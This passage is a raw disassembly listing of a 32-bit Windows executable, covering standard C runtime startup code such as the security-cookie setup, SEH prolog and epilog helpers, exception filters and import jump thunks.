  406023:	int3   
  406024:	int3   
  406025:	int3   
  406026:	int3   
  406027:	int3   
  406028:	jmp    DWORD PTR ds:0x40807c
  40602e:	int3   
  40602f:	int3   
  406030:	int3   
  406031:	int3   
  406032:	int3   
  406033:	int3   
  406034:	jmp    DWORD PTR ds:0x40808c
  40603a:	int3   
  40603b:	int3   
  40603c:	int3   
  40603d:	int3   
  40603e:	int3   
  40603f:	int3   
  406040:	mov    eax,0x5a4d
  406045:	cmp    WORD PTR ds:0x400000,ax
  40604c:	je     0x406052
  40604e:	xor    eax,eax
  406050:	jmp    0x4060a0
  406052:	mov    ecx,DWORD PTR ds:0x40003c
  406058:	cmp    DWORD PTR [ecx+0x400000],0x4550
  406062:	jne    0x40604e
  406064:	movzx  eax,WORD PTR [ecx+0x400018]
  40606b:	cmp    eax,0x10b
  406070:	je     0x40608c
  406072:	cmp    eax,0x20b
  406077:	jne    0x40604e
  406079:	xor    eax,eax
  40607b:	cmp    DWORD PTR [ecx+0x400084],0xe
  406082:	jbe    0x4060a0
  406084:	cmp    DWORD PTR [ecx+0x4000f8],eax
  40608a:	jmp    0x40609d
  40608c:	xor    eax,eax
  40608e:	cmp    DWORD PTR [ecx+0x400074],0xe
  406095:	jbe    0x4060a0
  406097:	cmp    DWORD PTR [ecx+0x4000e8],eax
  40609d:	setne  al
  4060a0:	push   0x2
  4060a2:	mov    ds:0x407198,eax
  4060a7:	call   0x4065de
  4060ac:	push   eax
  4060ad:	call   DWORD PTR ds:0x4082c0
  4060b3:	or     DWORD PTR ds:0x407570,0xffffffff
  4060ba:	or     DWORD PTR ds:0x407574,0xffffffff
  4060c1:	pop    ecx
  4060c2:	pop    ecx
  4060c3:	call   DWORD PTR ds:0x4082b0
  4060c9:	mov    ecx,DWORD PTR ds:0x4074c8
  4060cf:	mov    DWORD PTR [eax],ecx
  4060d1:	call   DWORD PTR ds:0x4082cc
  4060d7:	mov    ecx,DWORD PTR ds:0x4074bc
  4060dd:	mov    DWORD PTR [eax],ecx
  4060df:	call   0x406630
  4060e4:	cmp    DWORD PTR ds:0x407000,0x0
  4060eb:	jne    0x4060f9
  4060ed:	push   0x406630
  4060f2:	call   DWORD PTR ds:0x4082ac
  4060f8:	pop    ecx
  4060f9:	call   0x40683f
  4060fe:	xor    eax,eax
  406100:	ret    
  406101:	int3   
  406102:	int3   
  406103:	int3   
  406104:	int3   
  406105:	int3   
  406106:	int3   
  406107:	int3   
  406108:	int3   
  406109:	int3   
  40610a:	int3   
  40610b:	int3   
  40610c:	int3   
  40610d:	int3   
  40610e:	int3   
  40610f:	int3   
  406110:	mov    eax,ds:0x4074c4
  406115:	push   0x40719c
  40611a:	push   DWORD PTR ds:0x4074c0
  406120:	mov    ds:0x40719c,eax
  406125:	push   0x407190
  40612a:	push   0x40718c
  40612f:	push   0x407188
  406134:	call   DWORD PTR ds:0x4082c4
  40613a:	add    esp,0x14
  40613d:	mov    ds:0x407194,eax
  406142:	ret    
  406143:	int3   
  406144:	int3   
  406145:	int3   
  406146:	int3   
  406147:	int3   
  406148:	push   0x5c
  40614a:	push   0x406b18
  40614f:	call   0x406864
  406154:	and    DWORD PTR [ebp-0x24],0x0
  406158:	and    DWORD PTR [ebp-0x4],0x0
  40615c:	lea    eax,[ebp-0x6c]
  40615f:	push   eax
  406160:	call   DWORD PTR ds:0x4081f0
  406166:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40616d:	xor    ebx,ebx
  40616f:	inc    ebx
  406170:	mov    DWORD PTR [ebp-0x4],ebx
  406173:	mov    eax,fs:0x18
  406179:	mov    edi,DWORD PTR [eax+0x4]
  40617c:	xor    esi,esi
  40617e:	mov    edx,0x407578
  406183:	mov    ecx,edi
  406185:	xor    eax,eax
  406187:	lock cmpxchg DWORD PTR [edx],ecx
  40618b:	test   eax,eax
  40618d:	je     0x406195
  40618f:	cmp    eax,edi
  406191:	jne    0x4061a7
  406193:	mov    esi,ebx
  406195:	cmp    DWORD PTR ds:0x40757c,ebx
  40619b:	jne    0x4061b4
  40619d:	push   0x1f
  40619f:	call   0x40661a
  4061a4:	pop    ecx
  4061a5:	jmp    0x4061e3
  4061a7:	push   0x3e8
  4061ac:	call   DWORD PTR ds:0x408244
  4061b2:	jmp    0x40617e
  4061b4:	cmp    DWORD PTR ds:0x40757c,0x0
  4061bb:	jne    0x4061dd
  4061bd:	mov    DWORD PTR ds:0x40757c,ebx
  4061c3:	push   0x40101c
  4061c8:	push   0x401010
  4061cd:	call   0x406334
  4061d2:	pop    ecx
  4061d3:	pop    ecx
  4061d4:	test   eax,eax
  4061d6:	je     0x4061e3
  4061d8:	jmp    0x40631d
  4061dd:	mov    DWORD PTR ds:0x407184,ebx
  4061e3:	cmp    DWORD PTR ds:0x40757c,ebx
  4061e9:	jne    0x406206
  4061eb:	push   0x40100c
  4061f0:	push   0x401000
  4061f5:	call   0x406858
  4061fa:	pop    ecx
  4061fb:	pop    ecx
  4061fc:	mov    DWORD PTR ds:0x40757c,0x2
  406206:	test   esi,esi
  406208:	jne    0x406213
  40620a:	xor    eax,eax
  40620c:	mov    ecx,0x407578
  406211:	xchg   DWORD PTR [ecx],eax
  406213:	cmp    DWORD PTR ds:0x407580,0x0
  40621a:	je     0x406241
  40621c:	push   0x407580
  406221:	call   0x406690
  406226:	pop    ecx
  406227:	test   eax,eax
  406229:	je     0x406241
  40622b:	push   0x0
  40622d:	push   0x2
  40622f:	push   0x0
  406231:	mov    esi,DWORD PTR ds:0x407580
  406237:	mov    ecx,esi
  406239:	call   DWORD PTR ds:0x4082f0
  40623f:	call   esi
  406241:	mov    eax,ds:0x4082a4
  406246:	mov    ecx,DWORD PTR [eax]
  406248:	test   ecx,ecx
  40624a:	je     0x40631d
  406250:	mov    DWORD PTR [ebp-0x20],ecx
  406253:	push   0x20
  406255:	pop    esi
  406256:	mov    edx,DWORD PTR [ebp-0x24]
  406259:	movzx  eax,WORD PTR [ecx]
  40625c:	cmp    ax,si
  40625f:	ja     0x4062b1
  406261:	test   ax,ax
  406264:	je     0x40626a
  406266:	test   edx,edx
  406268:	jne    0x4062b1
  40626a:	movzx  eax,WORD PTR [ecx]
  40626d:	test   ax,ax
  406270:	je     0x40627f
  406272:	cmp    ax,si
  406275:	ja     0x40627f
  406277:	add    ecx,0x2
  40627a:	mov    DWORD PTR [ebp-0x20],ecx
  40627d:	jmp    0x40626a
  40627f:	test   BYTE PTR [ebp-0x40],0x1
  406283:	je     0x40628b
  406285:	movzx  eax,WORD PTR [ebp-0x3c]
  406289:	jmp    0x40628e
  40628b:	push   0xa
  40628d:	pop    eax
  40628e:	push   eax
  40628f:	push   ecx
  406290:	push   0x0
  406292:	push   0x400000
  406297:	call   0x402e8b
  40629c:	mov    ds:0x407180,eax
  4062a1:	cmp    DWORD PTR ds:0x407198,0x0
  4062a8:	jne    0x4062f9
  4062aa:	push   eax
  4062ab:	call   DWORD PTR ds:0x4082bc
  4062b1:	cmp    eax,0x22
  4062b4:	jne    0x4062c2
  4062b6:	xor    eax,eax
  4062b8:	test   edx,edx
  4062ba:	sete   al
  4062bd:	mov    edx,eax
  4062bf:	mov    DWORD PTR [ebp-0x24],edx
  4062c2:	add    ecx,0x2
  4062c5:	mov    DWORD PTR [ebp-0x20],ecx
  4062c8:	jmp    0x406259
  4062ca:	mov    ecx,DWORD PTR [ebp-0x14]
  4062cd:	mov    eax,DWORD PTR [ecx]
  4062cf:	mov    eax,DWORD PTR [eax]
  4062d1:	mov    DWORD PTR [ebp-0x28],eax
  4062d4:	push   ecx
  4062d5:	push   eax
  4062d6:	call   0x406564
  4062db:	pop    ecx
  4062dc:	pop    ecx
  4062dd:	ret    
  4062de:	mov    esp,DWORD PTR [ebp-0x18]
  4062e1:	mov    eax,DWORD PTR [ebp-0x28]
  4062e4:	mov    ds:0x407180,eax
  4062e9:	cmp    DWORD PTR ds:0x407198,0x0
  4062f0:	jne    0x4062f9
  4062f2:	push   eax
  4062f3:	call   DWORD PTR ds:0x4082b8
  4062f9:	cmp    DWORD PTR ds:0x407184,0x0
  406300:	jne    0x40630d
  406302:	call   DWORD PTR ds:0x4082b4
  406308:	mov    eax,ds:0x407180
  40630d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  406314:	jmp    0x406329
  406316:	xor    eax,eax
  406318:	inc    eax
  406319:	ret    
  40631a:	mov    esp,DWORD PTR [ebp-0x18]
  40631d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  406324:	mov    eax,0xff
  406329:	call   0x4068ac
  40632e:	ret    
  40632f:	int3   
  406330:	int3   
  406331:	int3   
  406332:	int3   
  406333:	int3   
  406334:	mov    edi,edi
  406336:	push   ebp
  406337:	mov    ebp,esp
  406339:	push   ecx
  40633a:	mov    eax,ds:0x407004
  40633f:	xor    eax,ebp
  406341:	mov    DWORD PTR [ebp-0x4],eax
  406344:	push   esi
  406345:	mov    esi,DWORD PTR [ebp+0x8]
  406348:	xor    eax,eax
  40634a:	cmp    esi,DWORD PTR [ebp+0xc]
  40634d:	jae    0x40636d
  40634f:	push   edi
  406350:	test   eax,eax
  406352:	jne    0x40636c
  406354:	mov    edi,DWORD PTR [esi]
  406356:	test   edi,edi
  406358:	je     0x406364
  40635a:	mov    ecx,edi
  40635c:	call   DWORD PTR ds:0x4082f0
  406362:	call   edi
  406364:	add    esi,0x4
  406367:	cmp    esi,DWORD PTR [ebp+0xc]
  40636a:	jb     0x406350
  40636c:	pop    edi
  40636d:	mov    ecx,DWORD PTR [ebp-0x4]
  406370:	xor    ecx,ebp
  406372:	pop    esi
  406373:	call   0x4063a0
  406378:	mov    esp,ebp
  40637a:	pop    ebp
  40637b:	ret    
  40637c:	int3   
  40637d:	int3   
  40637e:	int3   
  40637f:	int3   
  406380:	int3   
  406381:	int3   
  406382:	int3   
  406383:	int3   
  406384:	int3   
  406385:	int3   
  406386:	int3   
  406387:	int3   
  406388:	int3   
  406389:	int3   
  40638a:	int3   
  40638b:	int3   
  40638c:	int3   
  40638d:	int3   
  40638e:	int3   
  40638f:	int3   
  406390:	call   0x406798
  406395:	jmp    0x406148
  40639a:	int3   
  40639b:	int3   
  40639c:	int3   
  40639d:	int3   
  40639e:	int3   
  40639f:	int3   
  4063a0:	cmp    ecx,DWORD PTR ds:0x407004
  4063a6:	jne    0x4063ab
  4063a8:	ret    0x0
  4063ab:	jmp    0x4063e4
  4063b0:	int3   
  4063b1:	int3   
  4063b2:	int3   
  4063b3:	int3   
  4063b4:	int3   
  4063b5:	mov    edi,edi
  4063b7:	push   ebp
  4063b8:	mov    ebp,esp
  4063ba:	push   0x0
  4063bc:	call   DWORD PTR ds:0x408198
  4063c2:	push   DWORD PTR [ebp+0x8]
  4063c5:	call   DWORD PTR ds:0x40819c
  4063cb:	push   0xc0000409
  4063d0:	call   DWORD PTR ds:0x4081f4
  4063d6:	push   eax
  4063d7:	call   DWORD PTR ds:0x4081e8
  4063dd:	pop    ebp
  4063de:	ret    
  4063df:	int3   
  4063e0:	int3   
  4063e1:	int3   
  4063e2:	int3   
  4063e3:	int3   
  4063e4:	mov    edi,edi
  4063e6:	push   ebp
  4063e7:	mov    ebp,esp
  4063e9:	sub    esp,0x324
  4063ef:	mov    ds:0x4072a0,eax
  4063f4:	mov    DWORD PTR ds:0x40729c,ecx
  4063fa:	mov    DWORD PTR ds:0x407298,edx
  406400:	mov    DWORD PTR ds:0x407294,ebx
  406406:	mov    DWORD PTR ds:0x407290,esi
  40640c:	mov    DWORD PTR ds:0x40728c,edi
  406412:	data16 mov WORD PTR ds:0x4072b8,ss
  406419:	data16 mov WORD PTR ds:0x4072ac,cs
  406420:	data16 mov WORD PTR ds:0x407288,ds
  406427:	data16 mov WORD PTR ds:0x407284,es
  40642e:	data16 mov WORD PTR ds:0x407280,fs
  406435:	data16 mov WORD PTR ds:0x40727c,gs
  40643c:	pushf  
  40643d:	pop    DWORD PTR ds:0x4072b0
  406443:	mov    eax,DWORD PTR [ebp+0x0]
  406446:	mov    ds:0x4072a4,eax
  40644b:	mov    eax,DWORD PTR [ebp+0x4]
  40644e:	mov    ds:0x4072a8,eax
  406453:	lea    eax,[ebp+0x8]
  406456:	mov    ds:0x4072b4,eax
  40645b:	mov    eax,DWORD PTR [ebp-0x324]
  406461:	mov    DWORD PTR ds:0x4071f0,0x10001
  40646b:	mov    eax,ds:0x4072a8
  406470:	mov    ds:0x4071ac,eax
  406475:	mov    DWORD PTR ds:0x4071a0,0xc0000409
  40647f:	mov    DWORD PTR ds:0x4071a4,0x1
  406489:	mov    DWORD PTR ds:0x4071b0,0x3
  406493:	push   0x4
  406495:	pop    eax
  406496:	imul   eax,eax,0x0
  406499:	mov    DWORD PTR [eax+0x4071b4],0x2
  4064a3:	push   0x4
  4064a5:	pop    eax
  4064a6:	shl    eax,0x0
  4064a9:	mov    ecx,DWORD PTR ds:0x407004
  4064af:	mov    DWORD PTR [eax+0x4071b4],ecx
  4064b5:	push   0x4
  4064b7:	pop    eax
  4064b8:	shl    eax,1
  4064ba:	mov    ecx,DWORD PTR ds:0x407008
  4064c0:	mov    DWORD PTR [eax+0x4071b4],ecx
  4064c6:	push   0x4
  4064c8:	pop    eax
  4064c9:	imul   eax,eax,0x0
  4064cc:	mov    ecx,DWORD PTR ds:0x407004
  4064d2:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  4064d6:	push   0x4
  4064d8:	pop    eax
  4064d9:	shl    eax,0x0
  4064dc:	mov    ecx,DWORD PTR ds:0x407008
  4064e2:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  4064e6:	push   0x4010e0
  4064eb:	call   0x4063b5
  4064f0:	mov    esp,ebp
  4064f2:	pop    ebp
  4064f3:	ret    
  4064f4:	int3   
  4064f5:	int3   
  4064f6:	int3   
  4064f7:	int3   
  4064f8:	int3   
  4064f9:	int3   
  4064fa:	int3   
  4064fb:	int3   
  4064fc:	int3   
  4064fd:	int3   
  4064fe:	int3   
  4064ff:	int3   
  406500:	mov    edi,edi
  406502:	push   ebp
  406503:	mov    ebp,esp
  406505:	mov    eax,DWORD PTR [ebp+0x8]
  406508:	mov    eax,DWORD PTR [eax]
  40650a:	cmp    DWORD PTR [eax],0xe06d7363
  406510:	jne    0x40653d
  406512:	cmp    DWORD PTR [eax+0x10],0x3
  406516:	jne    0x40653d
  406518:	mov    eax,DWORD PTR [eax+0x14]
  40651b:	cmp    eax,0x19930520
  406520:	je     0x406537
  406522:	cmp    eax,0x19930521
  406527:	je     0x406537
  406529:	cmp    eax,0x19930522
  40652e:	je     0x406537
  406530:	cmp    eax,0x1994000
  406535:	jne    0x40653d
  406537:	call   DWORD PTR ds:0x4082a0
  40653d:	xor    eax,eax
  40653f:	pop    ebp
  406540:	ret    0x4
  406543:	int3   
  406544:	int3   
  406545:	int3   
  406546:	int3   
  406547:	int3   
  406548:	int3   
  406549:	int3   
  40654a:	int3   
  40654b:	int3   
  40654c:	int3   
  40654d:	int3   
  40654e:	int3   
  40654f:	int3   
  406550:	push   0x406500
  406555:	call   DWORD PTR ds:0x408198
  40655b:	xor    eax,eax
  40655d:	ret    
  40655e:	int3   
  40655f:	int3   
  406560:	int3   
  406561:	int3   
  406562:	int3   
  406563:	int3   
  406564:	jmp    DWORD PTR ds:0x4082d0
  40656a:	int3   
  40656b:	int3   
  40656c:	int3   
  40656d:	int3   
  40656e:	int3   
  40656f:	push   0xc
  406571:	push   0x406b40
  406576:	call   0x4068f8
  40657b:	xor    ecx,ecx
  40657d:	mov    eax,DWORD PTR [ebp+0x8]
  406580:	test   eax,eax
  406582:	je     0x4065cf
  406584:	cmp    eax,0xffffffff
  406587:	je     0x4065cf
  406589:	mov    DWORD PTR [ebp-0x4],ecx
  40658c:	mov    edx,0x5a4d
  406591:	cmp    WORD PTR [eax],dx
  406594:	jne    0x4065c8
  406596:	mov    edx,DWORD PTR [eax+0x3c]
  406599:	test   edx,edx
  40659b:	js     0x4065c8
  40659d:	cmp    edx,0x10000000
  4065a3:	jae    0x4065c8
  4065a5:	add    eax,edx
  4065a7:	mov    DWORD PTR [ebp-0x1c],eax
  4065aa:	mov    ecx,DWORD PTR [eax]
  4065ac:	sub    ecx,0x4550
  4065b2:	neg    ecx
  4065b4:	sbb    ecx,ecx
  4065b6:	not    ecx
  4065b8:	and    ecx,eax
  4065ba:	jmp    0x4065c5
  4065bc:	xor    eax,eax
  4065be:	inc    eax
  4065bf:	ret    
  4065c0:	mov    esp,DWORD PTR [ebp-0x18]
  4065c3:	xor    ecx,ecx
  4065c5:	mov    DWORD PTR [ebp-0x1c],ecx
  4065c8:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4065cf:	mov    eax,ecx
  4065d1:	call   0x40693d
  4065d6:	ret    0x4
  4065d9:	int3   
  4065da:	int3   
  4065db:	int3   
  4065dc:	int3   
  4065dd:	int3   
  4065de:	mov    edi,edi
  4065e0:	push   ebp
  4065e1:	mov    ebp,esp
  4065e3:	push   0x0
  4065e5:	call   DWORD PTR ds:0x4081c8
  4065eb:	test   eax,eax
  4065ed:	je     0x40660f
  4065ef:	push   eax
  4065f0:	call   0x40656f
  4065f5:	test   eax,eax
  4065f7:	je     0x40660f
  4065f9:	movzx  ecx,WORD PTR [eax+0x5c]
  4065fd:	push   0x2
  4065ff:	pop    eax
  406600:	cmp    cx,ax
  406603:	je     0x406612
  406605:	cmp    ecx,0x3
  406608:	jne    0x40660f
  40660a:	xor    eax,eax
  40660c:	inc    eax
  40660d:	pop    ebp
  40660e:	ret    
  40660f:	mov    eax,DWORD PTR [ebp+0x8]
  406612:	pop    ebp
  406613:	ret    
  406614:	int3   
  406615:	int3   
  406616:	int3   
  406617:	int3   
  406618:	int3   
  406619:	int3   
  40661a:	jmp    DWORD PTR ds:0x4082c8
  406620:	int3   
  406621:	int3   
  406622:	int3   
  406623:	int3   
  406624:	int3   
  406625:	int3   
  406626:	int3   
  406627:	int3   
  406628:	int3   
  406629:	int3   
  40662a:	int3   
  40662b:	int3   
  40662c:	int3   
  40662d:	int3   
  40662e:	int3   
  40662f:	int3   
  406630:	xor    eax,eax
  406632:	ret    
  406633:	int3   
  406634:	int3   
  406635:	int3   
  406636:	int3   
  406637:	int3   
  406638:	int3   
  406639:	int3   
  40663a:	int3   
  40663b:	int3   
  40663c:	int3   
  40663d:	int3   
  40663e:	int3   
  40663f:	int3   
  406640:	mov    edi,edi
  406642:	push   ebp
  406643:	mov    ebp,esp
  406645:	mov    eax,DWORD PTR [ebp+0x8]
  406648:	xor    edx,edx
  40664a:	push   ebx
  40664b:	push   esi
  40664c:	push   edi
  40664d:	mov    ecx,DWORD PTR [eax+0x3c]
  406650:	add    ecx,eax
  406652:	movzx  eax,WORD PTR [ecx+0x14]
  406656:	movzx  ebx,WORD PTR [ecx+0x6]
  40665a:	add    eax,0x18
  40665d:	add    eax,ecx
  40665f:	test   ebx,ebx
  406661:	je     0x40667e
  406663:	mov    edi,DWORD PTR [ebp+0xc]
  406666:	mov    esi,DWORD PTR [eax+0xc]
  406669:	cmp    edi,esi
  40666b:	jb     0x406676
  40666d:	mov    ecx,DWORD PTR [eax+0x8]
  406670:	add    ecx,esi
  406672:	cmp    edi,ecx
  406674:	jb     0x406680
  406676:	inc    edx
  406677:	add    eax,0x28
  40667a:	cmp    edx,ebx
  40667c:	jb     0x406666
  40667e:	xor    eax,eax
  406680:	pop    edi
  406681:	pop    esi
  406682:	pop    ebx
  406683:	pop    ebp
  406684:	ret    
  406685:	int3   
  406686:	int3   
  406687:	int3   
  406688:	int3   
  406689:	int3   
  40668a:	int3   
  40668b:	int3   
  40668c:	int3   
  40668d:	int3   
  40668e:	int3   
  40668f:	int3   
  406690:	mov    edi,edi
  406692:	push   ebp
  406693:	mov    ebp,esp
  406695:	push   0xfffffffe
  406697:	push   0x406b60
  40669c:	push   0x4068c0
  4066a1:	mov    eax,fs:0x0
  4066a7:	push   eax
  4066a8:	sub    esp,0x8
  4066ab:	push   ebx
  4066ac:	push   esi
  4066ad:	push   edi
  4066ae:	mov    eax,ds:0x407004
  4066b3:	xor    DWORD PTR [ebp-0x8],eax
  4066b6:	xor    eax,ebp
  4066b8:	push   eax
  4066b9:	lea    eax,[ebp-0x10]
  4066bc:	mov    fs:0x0,eax
  4066c2:	mov    DWORD PTR [ebp-0x18],esp
  4066c5:	mov    DWORD PTR [ebp-0x4],0x0
  4066cc:	push   0x400000
  4066d1:	call   0x406760
  4066d6:	add    esp,0x4
  4066d9:	test   eax,eax
  4066db:	je     0x406731
  4066dd:	mov    eax,DWORD PTR [ebp+0x8]
  4066e0:	sub    eax,0x400000
  4066e5:	push   eax
  4066e6:	push   0x400000
  4066eb:	call   0x406640
  4066f0:	add    esp,0x8
  4066f3:	test   eax,eax
  4066f5:	je     0x406731
  4066f7:	mov    eax,DWORD PTR [eax+0x24]
  4066fa:	shr    eax,0x1f
  4066fd:	not    eax
  4066ff:	and    eax,0x1
  406702:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  406709:	mov    ecx,DWORD PTR [ebp-0x10]
  40670c:	mov    DWORD PTR fs:0x0,ecx
  406713:	pop    ecx
  406714:	pop    edi
  406715:	pop    esi
  406716:	pop    ebx
  406717:	mov    esp,ebp
  406719:	pop    ebp
  40671a:	ret    
  40671b:	mov    eax,DWORD PTR [ebp-0x14]
  40671e:	mov    eax,DWORD PTR [eax]
  406720:	xor    ecx,ecx
  406722:	cmp    DWORD PTR [eax],0xc0000005
  406728:	sete   cl
  40672b:	mov    eax,ecx
  40672d:	ret    
  40672e:	mov    esp,DWORD PTR [ebp-0x18]
  406731:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  406738:	xor    eax,eax
  40673a:	mov    ecx,DWORD PTR [ebp-0x10]
  40673d:	mov    DWORD PTR fs:0x0,ecx
  406744:	pop    ecx
  406745:	pop    edi
  406746:	pop    esi
  406747:	pop    ebx
  406748:	mov    esp,ebp
  40674a:	pop    ebp
  40674b:	ret    
  40674c:	int3   
  40674d:	int3   
  40674e:	int3   
  40674f:	int3   
  406750:	int3   
  406751:	int3   
  406752:	int3   
  406753:	int3   
  406754:	int3   
  406755:	int3   
  406756:	int3   
  406757:	int3   
  406758:	int3   
  406759:	int3   
  40675a:	int3   
  40675b:	int3   
  40675c:	int3   
  40675d:	int3   
  40675e:	int3   
  40675f:	int3   
  406760:	mov    edi,edi
  406762:	push   ebp
  406763:	mov    ebp,esp
  406765:	mov    eax,DWORD PTR [ebp+0x8]
  406768:	mov    ecx,0x5a4d
  40676d:	cmp    WORD PTR [eax],cx
  406770:	je     0x406776
  406772:	xor    eax,eax
  406774:	pop    ebp
  406775:	ret    
  406776:	mov    ecx,DWORD PTR [eax+0x3c]
  406779:	add    ecx,eax
  40677b:	xor    eax,eax
  40677d:	cmp    DWORD PTR [ecx],0x4550
  406783:	jne    0x406791
  406785:	mov    edx,0x10b
  40678a:	cmp    WORD PTR [ecx+0x18],dx
  40678e:	sete   al
  406791:	pop    ebp
  406792:	ret    
  406793:	int3   
  406794:	int3   
  406795:	int3   
  406796:	int3   
  406797:	int3   
  406798:	mov    edi,edi
  40679a:	push   ebp
  40679b:	mov    ebp,esp
  40679d:	sub    esp,0x14
  4067a0:	and    DWORD PTR [ebp-0xc],0x0
  4067a4:	and    DWORD PTR [ebp-0x8],0x0
  4067a8:	mov    eax,ds:0x407004
  4067ad:	push   esi
  4067ae:	push   edi
  4067af:	mov    edi,0xbb40e64e
  4067b4:	mov    esi,0xffff0000
  4067b9:	cmp    eax,edi
  4067bb:	je     0x4067ca
  4067bd:	test   esi,eax
  4067bf:	je     0x4067ca
  4067c1:	not    eax
  4067c3:	mov    ds:0x407008,eax
  4067c8:	jmp    0x406834
  4067ca:	lea    eax,[ebp-0xc]
  4067cd:	push   eax
  4067ce:	call   DWORD PTR ds:0x408258
  4067d4:	mov    eax,DWORD PTR [ebp-0x8]
  4067d7:	xor    eax,DWORD PTR [ebp-0xc]
  4067da:	mov    DWORD PTR [ebp-0x4],eax
  4067dd:	call   DWORD PTR ds:0x4081f8
  4067e3:	xor    DWORD PTR [ebp-0x4],eax
  4067e6:	call   DWORD PTR ds:0x4081e4
  4067ec:	xor    DWORD PTR [ebp-0x4],eax
  4067ef:	call   DWORD PTR ds:0x408254
  4067f5:	xor    eax,DWORD PTR [ebp-0x4]
  4067f8:	lea    ecx,[ebp-0x4]
  4067fb:	xor    eax,ecx
  4067fd:	mov    DWORD PTR [ebp-0x4],eax
  406800:	lea    eax,[ebp-0x14]
  406803:	push   eax
  406804:	call   DWORD PTR ds:0x408208
  40680a:	mov    eax,DWORD PTR [ebp-0x10]
  40680d:	xor    eax,DWORD PTR [ebp-0x14]
  406810:	mov    ecx,DWORD PTR [ebp-0x4]
  406813:	xor    ecx,eax
  406815:	cmp    ecx,edi
  406817:	je     0x406821
  406819:	test   DWORD PTR ds:0x407004,esi
  40681f:	jne    0x406826
  406821:	mov    ecx,0xbb40e64f
  406826:	mov    DWORD PTR ds:0x407004,ecx
  40682c:	not    ecx
  40682e:	mov    DWORD PTR ds:0x407008,ecx
  406834:	pop    edi
  406835:	pop    esi
  406836:	mov    esp,ebp
  406838:	pop    ebp
  406839:	ret    
  40683a:	int3   
  40683b:	int3   
  40683c:	int3   
  40683d:	int3   
  40683e:	int3   
  40683f:	push   0x30000
  406844:	push   0x10000
  406849:	call   DWORD PTR ds:0x40829c
  40684f:	pop    ecx
  406850:	pop    ecx
  406851:	ret    
  406852:	int3   
  406853:	int3   
  406854:	int3   
  406855:	int3   
  406856:	int3   
  406857:	int3   
  406858:	jmp    DWORD PTR ds:0x4082a8
  40685e:	int3   
  40685f:	int3   
  406860:	int3   
  406861:	int3   
  406862:	int3   
  406863:	int3   
  406864:	push   0x4068c0
  406869:	push   DWORD PTR fs:0x0
  406870:	mov    eax,DWORD PTR [esp+0x10]
  406874:	mov    DWORD PTR [esp+0x10],ebp
  406878:	lea    ebp,[esp+0x10]
  40687c:	sub    esp,eax
  40687e:	push   ebx
  40687f:	push   esi
  406880:	push   edi
  406881:	mov    eax,ds:0x407004
  406886:	xor    DWORD PTR [ebp-0x4],eax
  406889:	xor    eax,ebp
  40688b:	mov    DWORD PTR [ebp-0x1c],eax
  40688e:	push   eax
  40688f:	mov    DWORD PTR [ebp-0x18],esp
  406892:	push   DWORD PTR [ebp-0x8]
  406895:	mov    eax,DWORD PTR [ebp-0x4]
  406898:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40689f:	mov    DWORD PTR [ebp-0x8],eax
  4068a2:	lea    eax,[ebp-0x10]
  4068a5:	mov    fs:0x0,eax
  4068ab:	ret    
  4068ac:	mov    ecx,DWORD PTR [ebp-0x1c]
  4068af:	xor    ecx,ebp
  4068b1:	call   0x4063a0
  4068b6:	jmp    0x40693d
  4068bb:	int3   
  4068bc:	int3   
  4068bd:	int3   
  4068be:	int3   
  4068bf:	int3   
  4068c0:	mov    edi,edi
  4068c2:	push   ebp
  4068c3:	mov    ebp,esp
  4068c5:	push   DWORD PTR [ebp+0x14]
  4068c8:	push   DWORD PTR [ebp+0x10]
  4068cb:	push   DWORD PTR [ebp+0xc]
  4068ce:	push   DWORD PTR [ebp+0x8]
  4068d1:	push   0x4063a0
  4068d6:	push   0x407004
  4068db:	call   0x406956
  4068e0:	add    esp,0x18
  4068e3:	pop    ebp
  4068e4:	ret    
  4068e5:	int3   
  4068e6:	int3   
  4068e7:	int3   
  4068e8:	int3   
  4068e9:	int3   
  4068ea:	int3   
  4068eb:	int3   
  4068ec:	int3   
  4068ed:	int3   
  4068ee:	int3   
  4068ef:	int3   
  4068f0:	ret    
  4068f1:	int3   
  4068f2:	int3   
  4068f3:	int3   
  4068f4:	int3   
  4068f5:	int3   
  4068f6:	int3   
  4068f7:	int3   
  4068f8:	push   0x4068c0
  4068fd:	push   DWORD PTR fs:0x0
  406904:	mov    eax,DWORD PTR [esp+0x10]
  406908:	mov    DWORD PTR [esp+0x10],ebp
  40690c:	lea    ebp,[esp+0x10]
  406910:	sub    esp,eax
  406912:	push   ebx
  406913:	push   esi
  406914:	push   edi
  406915:	mov    eax,ds:0x407004
  40691a:	xor    DWORD PTR [ebp-0x4],eax
  40691d:	xor    eax,ebp
  40691f:	push   eax
  406920:	mov    DWORD PTR [ebp-0x18],esp
  406923:	push   DWORD PTR [ebp-0x8]
  406926:	mov    eax,DWORD PTR [ebp-0x4]
  406929:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  406930:	mov    DWORD PTR [ebp-0x8],eax
  406933:	lea    eax,[ebp-0x10]
  406936:	mov    fs:0x0,eax
  40693c:	ret    
  40693d:	mov    ecx,DWORD PTR [ebp-0x10]
  406940:	mov    DWORD PTR fs:0x0,ecx
  406947:	pop    ecx
  406948:	pop    edi
  406949:	pop    edi
  40694a:	pop    esi
  40694b:	pop    ebx
  40694c:	mov    esp,ebp
  40694e:	pop    ebp
  40694f:	push   ecx
  406950:	ret    
  406951:	int3   
  406952:	int3   
  406953:	int3   
  406954:	int3   
  406955:	int3   
  406956:	jmp    DWORD PTR ds:0x408298
  40695c:	int3   
  40695d:	int3   
  40695e:	int3   
  40695f:	int3   
  406960:	int3   
  406961:	int3   
  406962:	jmp    DWORD PTR ds:0x4081cc
  406968:	int3   
  406969:	int3   
  40696a:	int3   
  40696b:	int3   
  40696c:	int3   
  40696d:	int3   
  40696e:	jmp    DWORD PTR ds:0x4081a0
  406974:	int3   
  406975:	int3   
  406976:	int3   
  406977:	int3   
  406978:	int3   
  406979:	jmp    0x4069cc
  40697e:	int3   
  40697f:	int3   
  406980:	int3   
  406981:	int3   
  406982:	int3   
  406983:	push   0x8
  406985:	mov    eax,0x406af9
  40698a:	call   0x4069f0
  40698f:	push   DWORD PTR [ebp+0x8]
